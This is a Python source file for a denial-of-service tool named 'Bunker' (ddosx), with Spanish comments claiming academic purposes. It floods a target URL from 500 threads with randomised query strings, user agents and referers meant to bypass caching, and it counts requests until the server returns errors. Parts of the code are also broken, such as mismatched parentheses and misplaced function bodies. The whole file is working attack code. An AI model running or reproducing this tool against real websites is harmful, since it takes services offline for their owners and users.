# ddosx
# Este software es con fines academicos


import time
from  colorama import  Fore, Style
import urllib.request
import sys
import threading
import random
import re
import useragents 

print("")
print("")
print(Fore.RED + "[" + Fore.RESET + "                         " + Fore.RED + "]" + Fore.BLUE + " 0"  + Fore.RED + "%")
print(Fore.RED + "[" + Fore.RESET +       "                 " + Fore.RED  + "]" +             Fore.RESET + "" + Fore.BLUE + "10" +                   Fore.RESET + "" + Fore.RED + "%")
#print(Fore.RED + "[" + Fore.RESET + "" + Fore.BLUE + "=" + Fore.RESET + "                " +Fore.RESET + "" + Fore.RED "]" + Fore.RESET "" + Fore.BLUE + "10" + Fore.RESER + "" + Fore.RED + "%")
time.sleep(1)
print("    [=                   ] 10%")
time.sleep(1)
print("    [==                  ] 20%")
time.sleep(1)
print("    [===                 ] 30%")
time.sleep(1)
print("    [====                ] 40%")
time.sleep(1)
print("    [=====               ] 50%")
time.sleep(1)
print("    [======              ] 60%")
time.sleep(1)
print("    [=======             ] 70%")
time.sleep(1)
print("    [========            ] 80%")
time.sleep(1)
print("    [===============     ] 85%")
time.sleep(1)
print("    [====================] 100%")
time.sleep(3)
#print("    Loading [==B=u=n=k=e=r=L=a=n=d]")
print("Loading " + Fore.BLUE + "[" + Fore.RESET + Fore.RED + "=" + Fore.RESET + "=".join("=B=u=n=k=e=r=L=a=n=d")
time.sleep(2)



# global params

web = ''
url = ''
host = ''
target_web = []
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0


def target_web():
 #   global target_web 
    if len(sys.argv) < 2:
 
        web = input("Ingresa Web Objetivo: ")
    else:
         web = sys.argv[1]

    return web
 
if __name__ == "__main__":
     
     web = target_web()
     print(target_web)
print("Web elegida: ", web)
 
#    global  target_web
 #   target_web.append(web)

def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

def useragent_list():
    global headers_useragents
selected_user_agent =  random.choice(useragents.user_agents_list)
headers_useragents.append(selected_user_agent)
print(Fore.YELLOW + "User-Agent seleccionado: " + Style.RESET_ALL, Fore.RED +  selected_user_agent + Style.RESET_ALL)

def referer_list():
    global headers_referers
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('http://' + host + '/')
    # Add more referers as needed
    return headers_referers

def buildblock(size):
    out_str = ''
    for i in range(size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return out_str

def usage():
    print('---------------------------------------------------')
    print('USO: python bunker.py <url>')
    print('Añade "seguridad" a la url, vulnerabilizándola con dos')
    print('---------------------------------------------------')

def httpcall(url):
    useragent_list()
    referer_list()
    code = 0
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
    request.add_header('Keep-Alive', str(random.randint(110, 120)))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host', host)
    try:
        urllib.request.urlopen(request)
    except urllib.error.HTTPError as e:
        set_flag(1)
        print('Respondió Code 500')
        code = 500
    except urllib.error.URLError as e:
        print(e.reason)
        sys.exit()
    else:
        inc_counter()
    return code

class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if code == 500 and safe == 1:
                    set_flag(2)
        except Exception as ex:
            pass

class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if previous + 100 < request_counter and previous != request_counter:
                print("%d Requests Sent" % request_counter)
                previous = request_counter
        if flag == 2:
            print("\n-- Ataque Bunker Finalizado --")

if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1] == "help":
        usage()
        sys.exit()
    else:
        print("-- Ataque Bunker Iniciado --")
        if len(sys.argv) == 3:
            if sys.argv[2] == "safe":
                set_safe()
        url = sys.argv[1]
        if url.count("/") == 2:
           #web = target + "/" 
           url = url + "/"
           m = re.search('(https?://)?([^/]*)/?.*', url)
           host = m.group(2)
        for i in range(500):
            t = HTTPThread()
            t.start()
        t = MonitorThread()
        t.start()

